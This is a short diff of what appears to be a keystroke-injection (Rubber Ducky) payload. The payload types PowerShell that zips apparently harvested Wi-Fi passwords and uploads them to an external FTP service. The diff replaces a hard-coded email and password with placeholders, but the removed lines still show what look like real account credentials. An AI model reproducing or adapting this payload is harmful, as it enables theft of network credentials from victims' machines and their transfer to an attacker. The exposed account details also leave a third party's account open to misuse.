@@ -28,9 +28,9 @@ STRING $Dir="C:\wp_pwd\wp_pwd.zip";
 ENTER
 STRING $ftp = "ftp://ftp.drivehq.com/"
 ENTER
-STRING $user = "velli@hi2.in" 
+STRING $user = "your email" 
 ENTER
-STRING $pass = "Velli_77DH28!"
+STRING $pass = "your password"
 ENTER
 STRING $webclient = New-Object System.Net.WebClient
 ENTER
